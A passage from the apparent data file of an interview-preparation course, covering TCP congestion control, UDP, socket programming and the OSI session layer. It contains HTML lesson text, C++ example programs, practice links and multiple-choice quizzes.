(overhead)</td><td>Faster</td></tr><tr><td>Use Cases</td><td>HTTP, HTTPS, SSH, FTP, Email</td><td>DNS, DHCP, VoIP, Gaming, Streaming</td></tr></table><div class="learn-warn"><b>Warning:</b> Common interview misconception: "UDP is always faster than TCP." While UDP has less overhead, TCP with modern optimizations (fast open, window scaling, CUBIC) can achieve very high throughput. The choice depends on whether you need reliability.</div></div><div class="learn-section"><div class="learn-h">Applications and Port Numbers</div><table class="learn-table"><tr><th>Application</th><th>Protocol</th><th>Port</th></tr><tr><td>HTTP</td><td>TCP</td><td>80</td></tr><tr><td>HTTPS</td><td>TCP</td><td>443</td></tr><tr><td>DNS</td><td>UDP (and TCP for large responses)</td><td>53</td></tr><tr><td>DHCP</td><td>UDP</td><td>67/68</td></tr><tr><td>SSH</td><td>TCP</td><td>22</td></tr><tr><td>FTP</td><td>TCP</td><td>20/21</td></tr><tr><td>SMTP</td><td>TCP</td><td>25</td></tr><tr><td>SNMP</td><td>UDP</td><td>161</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Trace cwnd: ssthresh=16, loss (3 dup ACKs) at cwnd=20 (Reno).</b><br>A: Slow Start: 1, 2, 4, 8, 16 (= ssthresh). Congestion Avoidance: 17, 18, 19, 20. At 20, 3 dup ACKs: Fast Retransmit, ssthresh = 10, cwnd = 10 (Fast Recovery). Resume CA: 11, 12, 13...</p><p class="learn-p"><b>Q2: TCP Tahoe vs Reno on 3 duplicate ACKs?</b><br>A: Both: ssthresh = cwnd/2, fast retransmit. Tahoe: cwnd=1, Slow Start. Reno: cwnd=ssthresh, Congestion Avoidance (Fast Recovery). Reno recovers faster.</p><p class="learn-p"><b>Q3: When to choose UDP over TCP?</b><br>A: Low latency critical (VoIP, gaming, trading data), loss tolerable, broadcast/multicast needed (DHCP), app handles own reliability (DNS, QUIC). TCP for reliable ordered delivery (web, email, DB).</p><p class="learn-p"><b>Q4: TCP BBR vs CUBIC?</b><br>A: CUBIC (default Linux) is loss-based — grows cwnd until loss, causes bufferbloat. BBR (Google) is model-based — estimates bottleneck bandwidth and min RTT, paces to match. BBR avoids filling buffers, better on lossy/wireless links.</p><p class="learn-p"><b>Q5: What is AIMD and why does it converge to fairness?</b><br>A: Additive Increase (+1 MSS/RTT), Multiplicative Decrease (halve on loss). Creates "sawtooth" pattern. Converges to fairness: flow with higher cwnd loses more on decrease, both gain equally on increase, driving toward equal shares.</p></div>',
          code: `// === TCP Congestion Control Simulation & UDP Socket in C++ ===
#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
using namespace std;

// ---- TCP Congestion Control Simulator ----
enum class TCPVariant { TAHOE, RENO };

struct CongestionState {
    double cwnd;      // congestion window (in MSS units)
    double ssthresh;  // slow start threshold
    int round;        // RTT round number
    string phase;     // current phase
};

void simulateTCPCongestion(TCPVariant variant, int rounds,
                           int lossRound, bool isDupAck) {
    string name = (variant == TCPVariant::TAHOE) ? "Tahoe" : "Reno";
    cout << "=== TCP " << name << " Congestion Control ===" << endl;
    cout << "Loss at round " << lossRound
         << (isDupAck ? " (3 dup ACKs)" : " (timeout)") << endl;
    cout << "Round\\tcwnd\\tssthresh\\tPhase" << endl;

    double cwnd = 1.0;
    double ssthresh = 64.0;
    string phase = "Slow Start";

    for (int r = 1; r <= rounds; r++) {
        // Check for loss event
        if (r == lossRound) {
            ssthresh = max(cwnd / 2.0, 2.0);

            if (!isDupAck) {
                // Timeout: both Tahoe and Reno go to cwnd=1
                cwnd = 1.0;
                phase = "Slow Start (after timeout)";
            } else {
                // 3 Dup ACKs
                if (variant == TCPVariant::TAHOE) {
                    cwnd = 1.0;
                    phase = "Slow Start (after 3 dup ACK)";
                } else {
                    // Reno: Fast Recovery
                    cwnd = ssthresh; // skip slow start
                    phase = "Cong. Avoidance (Fast Recovery)";
                }
            }
        } else {
            // Normal operation
            if (cwnd < ssthresh) {
                // Slow Start: exponential growth
                cwnd *= 2;
                if (cwnd >= ssthresh) {
                    cwnd = ssthresh;
                    phase = "Congestion Avoidance";
                } else {
                    phase = "Slow Start";
                }
            } else {
                // Congestion Avoidance: linear growth
                cwnd += 1;
                phase = "Congestion Avoidance";
            }
        }

        cout << r << "\\t" << (int)cwnd << "\\t" << (int)ssthresh
             << "\\t\\t" << phase << endl;
    }
}

// ---- TCP Throughput Calculator ----
void tcpThroughput() {
    cout << "\\n=== TCP Throughput Estimation ===" << endl;

    // Mathis formula: Throughput ≈ (MSS / RTT) * (C / sqrt(p))
    // where p = packet loss rate, C ≈ 1.22
    double mss = 1460;   // bytes
    double rtt = 0.050;  // 50 ms
    double losses[] = {0.001, 0.01, 0.05, 0.10};

    cout << "MSS=" << mss << " bytes, RTT=" << (rtt*1000) << " ms" << endl;
    cout << "Loss Rate\\tEstimated Throughput" << endl;

    for (double p : losses) {
        double throughput = (mss / rtt) * (1.22 / sqrt(p)); // bytes/sec
        double mbps = throughput * 8 / 1e6;
        cout << (p * 100) << "%\\t\\t"
             << (int)(mbps * 100) / 100.0 << " Mbps" << endl;
    }
}

// ---- UDP vs TCP Header Comparison ----
void headerComparison() {
    cout << "\\n=== Header Size Comparison ===" << endl;

    struct HeaderField {
        string name;
        int tcpBits;
        int udpBits;
    };

    vector<HeaderField> fields = {
        {"Source Port",       16, 16},
        {"Destination Port",  16, 16},
        {"Sequence Number",   32,  0},
        {"ACK Number",        32,  0},
        {"Data Offset",        4,  0},
        {"Reserved",           6,  0},
        {"Flags",              6,  0},
        {"Window Size",       16,  0},
        {"Checksum",          16, 16},
        {"Urgent Pointer",    16,  0},
        {"Length",             0, 16}
    };

    int tcpTotal = 0, udpTotal = 0;
    cout << "Field\\t\\t\\tTCP (bits)\\tUDP (bits)" << endl;
    for (auto& f : fields) {
        if (f.tcpBits > 0 || f.udpBits > 0) {
            cout << f.name;
            // Padding for alignment
            if (f.name.size() < 16) cout << "\\t";
            if (f.name.size() < 8) cout << "\\t";
            cout << "\\t" << f.tcpBits << "\\t\\t" << f.udpBits << endl;
        }
        tcpTotal += f.tcpBits;
        udpTotal += f.udpBits;
    }
    cout << "TOTAL\\t\\t\\t" << tcpTotal << " bits ("
         << tcpTotal/8 << " bytes)\\t" << udpTotal << " bits ("
         << udpTotal/8 << " bytes)" << endl;
}

// ---- AIMD Visualization ----
void aimdVisualization() {
    cout << "\\n=== AIMD Pattern (cwnd over time) ===" << endl;
    double cwnd = 1.0, ssthresh = 16.0;
    int cycle = 0;

    for (int r = 1; r <= 40; r++) {
        if (cwnd < ssthresh) {
            cwnd *= 2;
            if (cwnd > ssthresh) cwnd = ssthresh;
        } else {
            cwnd += 1;
        }

        // Simulate loss at cwnd = 24
        if (cwnd >= 24) {
            cout << "RTT " << r << ": cwnd=" << (int)cwnd
                 << " ** LOSS ** ";
            ssthresh = cwnd / 2;
            cwnd = ssthresh; // Reno behavior
            cout << "ssthresh=" << (int)ssthresh << endl;
            cycle++;
            if (cycle >= 3) break;
        } else {
            // Print bar chart
            cout << "RTT " << r << ": cwnd=" << (int)cwnd << " ";
            for (int i = 0; i < (int)cwnd; i++) cout << "#";
            cout << endl;
        }
    }
}

int main() {
    // TCP Reno with 3 dup ACKs at round 10
    simulateTCPCongestion(TCPVariant::RENO, 20, 10, true);

    cout << endl;
    // TCP Tahoe with timeout at round 10
    simulateTCPCongestion(TCPVariant::TAHOE, 20, 10, false);

    tcpThroughput();
    headerComparison();
    aimdVisualization();
    return 0;
}`,
          problems: [
            ['TCP Congestion Control Practice', 'https://www.geeksforgeeks.org/tcp-congestion-control/', 'Medium'],
            ['Difference Between TCP and UDP', 'https://www.geeksforgeeks.org/differences-between-tcp-and-udp/', 'Easy'],
            ['TCP Tahoe vs Reno Numericals', 'https://www.geeksforgeeks.org/tcp-tahoe-and-tcp-reno/', 'Hard'],
            ['TCP CUBIC vs BBR', 'https://www.geeksforgeeks.org/tcp-congestion-control/', 'Hard'],
            ['UDP Header Analysis', 'https://www.geeksforgeeks.org/user-datagram-protocol-udp/', 'Easy'],
            ['Congestion Window Tracing', 'https://www.geeksforgeeks.org/tcp-tahoe-and-tcp-reno/', 'Medium']
          ],
          mcqs: [
            {q: 'In TCP Reno, when 3 duplicate ACKs are received, the congestion window (cwnd) is set to:', o: ['1 MSS (Slow Start)', 'ssthresh (Fast Recovery)', 'cwnd / 2', 'Unchanged'], a: 1},
            {q: 'The UDP header size is:', o: ['20 bytes', '8 bytes', '12 bytes', '16 bytes'], a: 1},
            {q: 'TCP\'s AIMD stands for:', o: ['Adaptive Increase, Moderate Decrease', 'Additive Increase, Multiplicative Decrease', 'Aggressive Increase, Minimal Decrease', 'Automatic Increase, Manual Decrease'], a: 1},
            {q: 'During TCP Slow Start, cwnd grows:', o: ['Linearly', 'Exponentially (doubles per RTT)', 'Stays constant', 'Cubically'], a: 1},
            {q: 'On TCP timeout (both Tahoe and Reno), cwnd becomes:', o: ['cwnd / 2', 'ssthresh', '1 MSS', '0'], a: 2},
            {q: 'DNS uses UDP because:', o: ['UDP is more secure', 'Queries are small and latency matters', 'UDP supports encryption', 'TCP cannot handle DNS'], a: 1},
            {q: 'TCP Fast Retransmit is triggered by:', o: ['Timeout', '1 duplicate ACK', '3 duplicate ACKs', 'Receiver NAK'], a: 2},
            {q: 'Default congestion control in Linux is:', o: ['TCP Tahoe', 'TCP Reno', 'TCP CUBIC', 'TCP BBR'], a: 2}
          ],
        },
        {
          t: 'Socket Programming',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Every networked application — web servers handling millions of connections to trading systems processing market data — is built on <b>sockets</b>. Interview questions ask you to compare TCP vs UDP socket flows, explain how servers handle concurrency (fork vs threads vs epoll), or discuss the C10K problem. Engineers on trading infrastructure work directly with low-latency socket programming.</p></div><div class="learn-section"><div class="learn-h">What is a Socket?</div><p class="learn-p">A <b>socket</b> is an endpoint for communication between two machines over a network. It is identified by an <b>IP address + port number</b> pair. The socket API (Berkeley sockets) provides a standard interface for network programming across TCP and UDP.</p><p class="learn-p">Socket = (IP Address, Port Number). A connection is uniquely identified by a <b>4-tuple</b>: (source IP, source port, destination IP, destination port).</p></div><div class="learn-section"><div class="learn-h">TCP Socket Flow</div><div class="learn-code">SERVER SIDE:                         CLIENT SIDE:\n─────────────                        ────────────\nsocket()      ← Create socket        socket()\n    │                                     │\nbind()        ← Bind to port              │\n    │                                     │\nlisten()      ← Mark as passive           │\n    │                                     │\naccept()      ← Wait for connection  connect()  ← Initiate 3-way handshake\n    │         ←─── TCP Handshake ───→     │\n    │              (SYN/SYN-ACK/ACK)      │\nrecv()/send() ← Data exchange ─────→ send()/recv()\n    │                                     │\nclose()       ← Terminate ──────────→ close()\n              ←─── FIN/ACK ──────────→</div></div><div class="learn-section"><div class="learn-h">Key Socket System Calls</div><table class="learn-table"><tr><th>Call</th><th>Description</th><th>TCP</th><th>UDP</th></tr><tr><td>socket()</td><td>Create a new socket (returns file descriptor)</td><td>Yes</td><td>Yes</td></tr><tr><td>bind()</td><td>Assign local address and port to socket</td><td>Server</td><td>Optional</td></tr><tr><td>listen()</td><td>Mark socket as passive (accepts connections)</td><td>Server</td><td>N/A</td></tr><tr><td>accept()</td><td>Accept incoming connection (blocks, returns new fd)</td><td>Server</td><td>N/A</td></tr><tr><td>connect()</td><td>Initiate connection to remote server</td><td>Client</td><td>Optional</td></tr><tr><td>send()/recv()</td><td>Send/receive data on connected socket</td><td>Yes</td><td>No</td></tr><tr><td>sendto()/recvfrom()</td><td>Send/receive with explicit address</td><td>No</td><td>Yes</td></tr><tr><td>close()</td><td>Close the socket</td><td>Yes</td><td>Yes</td></tr></table></div><div class="learn-section"><div class="learn-h">UDP Socket Flow</div><div class="learn-code">SERVER:                       CLIENT:\nsocket(SOCK_DGRAM)            socket(SOCK_DGRAM)\nbind()                             │\n    │                         sendto(server_addr)\nrecvfrom() ←──── datagram ────     │\nsendto()   ────  datagram ───→ recvfrom()\nclose()                        close()\n\nNo connection setup! No handshake!\nEach datagram is independent.</div></div><div class="learn-section"><div class="learn-h">Concurrency Models for Servers</div><table class="learn-table"><tr><th>Model</th><th>Mechanism</th><th>Pros</th><th>Cons</th></tr><tr><td>Iterative</td><td>Handle one client at a time</td><td>Simple</td><td>Blocks on slow clients</td></tr><tr><td>Fork per client</td><td>fork() on each accept()</td><td>Isolation</td><td>Heavy (process overhead)</td></tr><tr><td>Thread per client</td><td>pthread_create on each accept()</td><td>Lighter than fork</td><td>Thread limits, races</td></tr><tr><td>I/O Multiplexing</td><td>select()/poll()/epoll()</td><td>Single thread, many clients</td><td>Complexity</td></tr><tr><td>Event-driven</td><td>epoll + non-blocking I/O</td><td>Scalable (Node.js, nginx)</td><td>Callback complexity</td></tr></table><div class="learn-tip"><b>Interview tip:</b> Know the C10K problem: how to handle 10,000+ concurrent connections. The answer is I/O multiplexing (epoll on Linux, kqueue on macOS) — not thread-per-connection. This is how nginx, Node.js, and Redis achieve high concurrency.</div></div><div class="learn-section"><div class="learn-h">Important Socket Options</div><table class="learn-table"><tr><th>Option</th><th>Level</th><th>Purpose</th></tr><tr><td>SO_REUSEADDR</td><td>SOL_SOCKET</td><td>Allow reuse of local address (avoids "Address already in use")</td></tr><tr><td>SO_KEEPALIVE</td><td>SOL_SOCKET</td><td>Send periodic probes to detect dead connections</td></tr><tr><td>TCP_NODELAY</td><td>IPPROTO_TCP</td><td>Disable Nagle\'s algorithm (send small packets immediately)</td></tr><tr><td>SO_RCVBUF / SO_SNDBUF</td><td>SOL_SOCKET</td><td>Set receive/send buffer sizes</td></tr><tr><td>SO_LINGER</td><td>SOL_SOCKET</td><td>Control behavior on close() with pending data</td></tr></table></div><div class="learn-section"><div class="learn-h">I/O Multiplexing: select vs poll vs epoll</div><table class="learn-table"><tr><th>Feature</th><th>select()</th><th>poll()</th><th>epoll (Linux)</th></tr><tr><td>Max FDs</td><td>FD_SETSIZE (typically 1024)</td><td>No limit (uses pollfd array)</td><td>No limit</td></tr><tr><td>Mechanism</td><td>Copy fd_set to/from kernel each call</td><td>Copy pollfd array to/from kernel</td><td>Kernel maintains interest list</td></tr><tr><td>Performance</td><td><span class="learn-complexity">O(n)</span> — kernel scans all FDs</td><td><span class="learn-complexity">O(n)</span> — same scan</td><td><span class="learn-complexity">O(1)</span> per event returned</td></tr><tr><td>Scalability</td><td>Poor at scale</td><td>Better (no FD limit)</td><td>Excellent (millions of connections)</td></tr><tr><td>API</td><td>select(nfds, readfds, writefds, exceptfds, timeout)</td><td>poll(fds, nfds, timeout)</td><td>epoll_create, epoll_ctl, epoll_wait</td></tr><tr><td>Portability</td><td>Everywhere (POSIX)</td><td>Most Unix (POSIX)</td><td>Linux only (kqueue on macOS/BSD)</td></tr></table><div class="learn-code">// epoll workflow (Linux):\nint epfd = epoll_create1(0);          // create epoll instance\n\nstruct epoll_event ev;\nev.events = EPOLLIN;                  // interested in read events\nev.data.fd = listen_fd;\nepoll_ctl(epfd, EPOLL_CTL_ADD, listen_fd, &amp;ev);  // register fd\n\n// Event loop:\nstruct epoll_event events[MAX_EVENTS];\nwhile (1) {\n    int n = epoll_wait(epfd, events, MAX_EVENTS, -1);  // block\n    for (int i = 0; i &lt; n; i++) {  // only ready fds returned!\n        if (events[i].data.fd == listen_fd)\n            accept_new_client();\n        else\n            handle_client_data(events[i].data.fd);\n    }\n}</div><p class="learn-p"><b>Why epoll wins:</b> select/poll copy the entire interest set to/from kernel on each call and the kernel scans all FDs (even idle ones). epoll registers interest once via epoll_ctl, and epoll_wait returns <b>only ready FDs</b> — no scanning. With 10,000 connections but only 10 active, select scans 10,000; epoll returns 10.</p></div><div class="learn-section"><div class="learn-h">Blocking vs Non-Blocking Sockets</div><p class="learn-p">By default, sockets are <b>blocking</b>: recv() waits until data arrives, accept() waits for a connection, connect() waits for the handshake. With <b>non-blocking</b> mode, these calls return immediately — if no data is available, they return -1 with <code>errno = EAGAIN</code> (or EWOULDBLOCK).</p><div class="learn-code">// Set non-blocking mode:\nint flags = fcntl(sockfd, F_GETFL, 0);\nfcntl(sockfd, F_SETFL, flags | O_NONBLOCK);\n\n// Non-blocking recv:\nint n = recv(sockfd, buf, sizeof(buf), 0);\nif (n == -1 &amp;&amp; (errno == EAGAIN || errno == EWOULDBLOCK)) {\n    // No data available right now — try again later\n} else if (n == 0) {\n    // Connection closed by peer\n} else {\n    // Got n bytes of data\n}</div><p class="learn-p"><b>Why non-blocking matters:</b> I/O multiplexing (epoll) requires non-blocking sockets. If a socket is reported as "ready" but the data was consumed between epoll_wait returning and recv being called (spurious wakeup), a blocking recv would deadlock the event loop. Non-blocking ensures the loop always continues.</p></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Listening socket vs connected socket?</b><br>A: The listening socket (socket+bind+listen) waits for connections. accept() returns a NEW connected socket (new fd) for each client. The listening socket continues accepting others. Each connected socket is identified by the unique 4-tuple.</p><p class="learn-p"><b>Q2: Why does UDP not need listen() and accept()?</b><br>A: UDP is connectionless — no handshake. Server uses recvfrom() to receive from any source and sendto() to respond. Each datagram is independent. No per-client state, no connected socket per client.</p><p class="learn-p"><b>Q3: What is the C10K problem?</b><br>A: How to handle 10K+ concurrent connections. Thread-per-connection fails (memory/context-switching). Solution: I/O multiplexing — single thread monitors many sockets using select/poll/epoll (Linux) or kqueue (macOS). This is how nginx, Node.js, Redis work. epoll is O(1) per event vs select\'s O(n).</p><p class="learn-p"><b>Q4: What does SO_REUSEADDR do?</b><br>A: Allows binding to a port in TIME_WAIT state. Without it, restarting a server fails with "Address already in use" for up to 60s. Standard practice on all server sockets.</p><p class="learn-p"><b>Q5: What is TCP_NODELAY?</b><br>A: Disables Nagle\'s Algorithm, sending each write immediately instead of buffering. Essential for latency-sensitive applications (SSH, gaming, trading).</p></div>',
          code: `// === TCP Socket Programming in C++ (POSIX) ===

// ===== TCP SERVER =====
#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

void tcp_server() {
    // 1. Create socket
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); return; }

    // Allow address reuse (avoid "Address already in use")
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // 2. Bind to address and port
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;  // Listen on all interfaces
    addr.sin_port = htons(8080);         // Port 8080, network byte order

    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind"); return;
    }

    // 3. Listen (backlog = 5 pending connections)
    listen(server_fd, 5);
    std::cout << "Server listening on port 8080..." << std::endl;

    // 4. Accept connections in a loop
    while (true) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);

        if (client_fd < 0) { perror("accept"); continue; }

        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
        std::cout << "Client connected: " << client_ip
                  << ":" << ntohs(client_addr.sin_port) << std::endl;

        // 5. Receive and echo back
        char buffer[1024];
        ssize_t bytes = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\\0';
            std::cout << "Received: " << buffer << std::endl;
            send(client_fd, buffer, bytes, 0);  // Echo back
        }

        // 6. Close client connection
        close(client_fd);
    }
    close(server_fd);
}

// ===== TCP CLIENT =====
void tcp_client() {
    // 1. Create socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    // 2. Connect to server
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8080);
    inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect"); return;
    }

    // 3. Send data
    const char* msg = "Hello, Server!";
    send(sock, msg, strlen(msg), 0);

    // 4. Receive response
    char buffer[1024];
    ssize_t bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
    buffer[bytes] = '\\0';
    std::cout << "Server replied: " << buffer << std::endl;

    close(sock);
}

// ===== UDP SERVER (connectionless) =====
void udp_server() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);  // SOCK_DGRAM for UDP

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(9090);

    bind(sock, (struct sockaddr*)&addr, sizeof(addr));

    char buffer[1024];
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);

    // No listen() or accept() — just recvfrom()
    ssize_t bytes = recvfrom(sock, buffer, sizeof(buffer) - 1, 0,
                             (struct sockaddr*)&client_addr, &client_len);
    buffer[bytes] = '\\0';
    std::cout << "UDP received: " << buffer << std::endl;

    // Echo back using sendto()
    sendto(sock, buffer, bytes, 0,
           (struct sockaddr*)&client_addr, client_len);

    close(sock);
}

int main() {
    std::cout << "Socket Programming Demo" << std::endl;
    // Run tcp_server() or tcp_client() or udp_server()
    return 0;
}`,
          problems: [
            ['Socket Programming Basics', 'https://www.geeksforgeeks.org/socket-programming-cc/', 'Medium'],
            ['TCP vs UDP Sockets', 'https://www.geeksforgeeks.org/differences-between-tcp-and-udp/', 'Easy'],
            ['Concurrent Server Design', 'https://www.geeksforgeeks.org/handling-multiple-clients-on-server-with-multithreading-using-socket-programming-in-c-cpp/', 'Hard'],
            ['Non-blocking I/O and epoll', 'https://www.geeksforgeeks.org/non-blocking-io-with-pipes-in-c/', 'Hard'],
            ['TCP vs UDP Socket Comparison', 'https://www.geeksforgeeks.org/tcp-and-udp-server-using-select/', 'Medium']
          ],
          mcqs: [
            {q: 'The accept() system call on a TCP server returns:', o: ['The same socket file descriptor', 'A NEW socket file descriptor for the client connection', 'The client\'s IP address only', 'The number of bytes received'], a: 1},
            {q: 'Which socket type is used for UDP communication?', o: ['SOCK_STREAM', 'SOCK_DGRAM', 'SOCK_RAW', 'SOCK_SEQPACKET'], a: 1},
            {q: 'What does htons() do?', o: ['Hash the port number', 'Convert host byte order to network byte order (short)', 'Create a new socket handle', 'Set the socket to non-blocking mode'], a: 1},
            {q: 'In a concurrent server using I/O multiplexing, which system call monitors multiple file descriptors?', o: ['fork()', 'accept()', 'select() / epoll()', 'listen()'], a: 2},
            {q: 'The listen() backlog parameter specifies:', o: ['Max data size', 'Max pending connections', 'Socket timeout', 'Thread count'], a: 1},
            {q: 'epoll is preferred over select() because:', o: ['UDP only', 'O(1) per event vs O(n)', 'Portable across all OS', 'Encrypts connections'], a: 1},
            {q: 'A TCP connection is identified by:', o: ['(src IP, dst IP, protocol, TTL)', '(src IP, src port, dst IP, dst port)', '(src MAC, dst MAC, src IP, dst IP)', '(protocol, src port, dst port, seq)'], a: 1}
          ]
        }
      ]
    },
    // ==================== TAB 5: Session Layer (OSI Layer 5) ====================
    {
      id: 'session', t: 'Session Layer',
      topics: [
        {
          t: 'Session Layer — Session Management & RPCs',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">The <b>Session Layer (Layer 5)</b> manages the establishment, maintenance, and teardown of communication sessions between applications. While the TCP/IP model merges this into the Application layer, the concepts are still vital for understanding <b>how web sessions work, RPC mechanisms, and connection management</b> — all frequently tested in SDE placement interviews. Session management is critical for maintaining state in trading terminals, managing persistent WebSocket connections for real-time market data feeds, and implementing reliable RPC frameworks for distributed systems.</p></div><div class="learn-section"><div class="learn-h">What is a Session?</div><p class="learn-p">A <b>session</b> is a logical connection between two communicating entities that persists across multiple requests. Unlike a transport-layer connection (TCP), which is about delivering bytes reliably, a session is about maintaining <b>application-level state</b> and <b>dialog structure</b>.</p><div class="learn-code">Session vs Connection:\n\nTCP Connection: Reliable byte stream between two endpoints\n  └─ Handles: ordering, retransmission, flow control\n  └─ Identified by: (src_ip, src_port, dst_ip, dst_port)\n\nSession: Application-level logical association\n  └─ Handles: login state, dialog control, synchronization\n  └─ Identified by: session ID, token, cookie\n  └─ Can span multiple TCP connections (HTTP keep-alive)\n  └─ Can be resumed after a connection drops</div></div><div class="learn-section"><div class="learn-h">Session Layer Functions</div><ul class="learn-list"><li><b>Session Establishment:</b> Authentication, parameter negotiation, and session ID generation. Example: TLS handshake establishes a secure session before application data flows.</li><li><b>Session Maintenance:</b> Keep-alive messages, idle timeout management, and session state tracking. Example: HTTP cookies maintain user sessions across stateless requests.</li><li><b>Session Termination:</b> Graceful shutdown, resource cleanup, and state persistence. Example: logout invalidates the session token on the server.</li><li><b>Dialog Control:</b> Manages who can transmit and when:<ul><li><b>Simplex:</b> One-way communication only (e.g., broadcast TV)</li><li><b>Half-duplex:</b> Two-way, but one at a time (e.g., walkie-talkie, HTTP 1.0 request-response)</li><li><b>Full-duplex:</b> Both parties transmit simultaneously (e.g., WebSocket, telephone)</li></ul></li><li><b>Synchronization:</b> Inserting checkpoints (sync points) in data streams so that if a failure occurs, transmission can resume from the last checkpoint rather than starting over. Critical for long file transfers.</li><li><b>Token Management:</b> Controls which party has the right to perform certain operations (e.g., who can send data, who can initiate disconnect).</li></ul></div><div class="learn-section"><div class="learn-h">Session Layer Protocols</div><table class="learn-table"><tr><th>Protocol</th><th>Function</th><th>Modern Equivalent</th></tr><tr><td>NetBIOS</td><td>Name service, session, datagram for LAN</td><td>Largely replaced by DNS + TCP</td></tr><tr><td>RPC (Remote Procedure Call)</td><td>Call functions on remote machines</td><td>gRPC, Apache Thrift</td></tr><tr><td>PPTP</td><td>VPN tunneling protocol</td><td>WireGuard, OpenVPN</td></tr><tr><td>SIP (Session Initiation Protocol)</td><td>Establish/terminate multimedia sessions</td><td>Used in VoIP (Skype, Zoom)</td></tr><tr><td>SMPP</td><td>SMS messaging sessions</td><td>Still used in telecom</td></tr></table></div><div class="learn-section"><div class="learn-h">Remote Procedure Call (RPC)</div><p class="learn-p"><b>RPC</b> allows a program to call a function on a remote machine as if it were local. The caller does not need to know network details — the <b>stub</b> handles marshalling (serializing) parameters, sending them over the network, and unmarshalling the result.</p><div class="learn-code">RPC Flow:\n\n  Client Process          Network           Server Process\n  ┌─────────────┐                        ┌─────────────┐\n  │ Client Code │────────────────────────▶│ Server Code │\n  ├─────────────┤                        ├─────────────┤\n  │ Client Stub │  ──marshal──▶          │ Server Stub │\n  ├─────────────┤   request              ├─────────────┤\n  │  Transport  │  ◄──result──           │  Transport  │\n  └─────────────┘   response             └─────────────┘\n\nSteps:\n1. Client calls stub function (looks like a local call)\n2. Client stub marshals (serializes) parameters\n3. Transport sends request to server\n4. Server stub unmarshals parameters\n5. Server stub calls actual server function\n6. Result marshalled and sent back\n7. Client stub unmarshals result and returns to caller</div><p class="learn-p"><b>Modern RPC frameworks:</b></p><table class="learn-table"><tr><th>Framework</th><th>Serialization</th><th>Transport</th><th>Language Support</th></tr><tr><td>gRPC (Google)</td><td>Protocol Buffers</td><td>HTTP/2</td><td>Multi-language (C++, Java, Python, Go)</td></tr><tr><td>Apache Thrift</td><td>Thrift Binary/Compact</td><td>TCP, HTTP</td><td>Multi-language</td></tr><tr><td>JSON-RPC</td><td>JSON</td><td>HTTP</td><td>Any</td></tr><tr><td>XML-RPC</td><td>XML</td><td>HTTP</td><td>Any</td></tr></table></div><div class="learn-section"><div class="learn-h">Web Sessions in Practice</div><p class="learn-p">Modern web applications implement session management at the application level:</p><div class="learn-code">HTTP Session Management:\n\n1. Cookie-based sessions:\n   Client logs in → Server creates session, stores in memory/Redis\n   Server sends: Set-Cookie: session_id=abc123; HttpOnly; Secure\n   Client sends: Cookie: session_id=abc123 (on every request)\n   Server looks up session_id → retrieves user state\n\n2. Token-based sessions (JWT):\n   Client logs in → Server signs JWT with secret key\n   Server sends: { token: "eyJhbGci..." }\n   Client sends: Authorization: Bearer eyJhbGci...\n   Server verifies signature → extracts claims (no server-side lookup)\n\nCookie Sessions vs JWT:\n  Cookie: Stateful (server stores session), easy to revoke\n  JWT:    Stateless (self-contained), hard to revoke, scalable</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What are the key functions of the Session Layer?</b><br>A: Session establishment (authentication, ID generation), maintenance (keep-alive, state tracking), termination (logout, cleanup), dialog control (simplex/half-duplex/full-duplex), synchronization (checkpoints for resumption), and token management (controlling who can transmit).</p><p class="learn-p"><b>Q2: Explain the RPC mechanism.</b><br>A: RPC lets a client call a function on a remote server as if it were local. The client stub marshals (serializes) parameters and sends them over the network. The server stub unmarshals them, executes the function, marshals the result, and sends it back. The client stub unmarshals the result and returns it to the caller. Modern implementations: gRPC (Protocol Buffers over HTTP/2), Thrift.</p><p class="learn-p"><b>Q3: What is the difference between simplex, half-duplex, and full-duplex?</b><br>A: Simplex: one-way only (TV broadcast). Half-duplex: two-way but alternating (walkie-talkie, HTTP/1.0). Full-duplex: simultaneous two-way (WebSocket, telephone). The session layer controls which mode is used for a given dialog.</p><p class="learn-p"><b>Q4: Compare cookie-based sessions with JWT tokens.</b><br>A: Cookies are stateful — the server stores session data and the cookie is just an ID. Easy to revoke (delete from server store). JWT is stateless — the token contains the claims, signed by the server. No server-side storage needed (scalable), but hard to revoke before expiry. Use cookies for traditional web apps; JWT for APIs and microservices.</p><p class="learn-p"><b>Q5: What are synchronization points in the Session Layer?</b><br>A: Checkpoints inserted into a data stream during long transfers. If a failure occurs, the session can resume from the last checkpoint instead of starting over. Two types: major sync points (require acknowledgment) and minor sync points (no acknowledgment needed). Analogous to save points in a database transaction.</p></div>',
